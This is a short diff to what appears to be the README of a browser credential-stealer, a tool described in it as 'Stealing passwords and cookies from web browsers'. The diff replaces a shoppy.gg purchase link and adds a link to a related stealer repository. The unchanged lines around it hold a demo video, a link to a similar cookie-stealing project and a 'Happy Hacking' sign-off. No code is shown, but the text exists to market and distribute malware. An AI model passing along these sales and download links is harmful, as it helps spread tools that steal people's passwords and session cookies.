@@ -63,7 +63,7 @@ Stealing passwords and cookies from web browsers
 * Opera
 * yandex
 
-https://shoppy.gg/product/UcZcKPu
+https://shoppy.gg/product/RfFAnNR
 
 
 ## Demo Youtube (simple installation )
@@ -83,6 +83,8 @@ https://www.facebook.com/102313318301415/videos/3262395040481000/
 ## other similar project
 
 https://github.com/hakanonymos/steal-cookie-chrome-firefox
+
+https://github.com/hakanonymos/A310LoggerStealer ( 2021 )
 
 Happy Hacking 
 
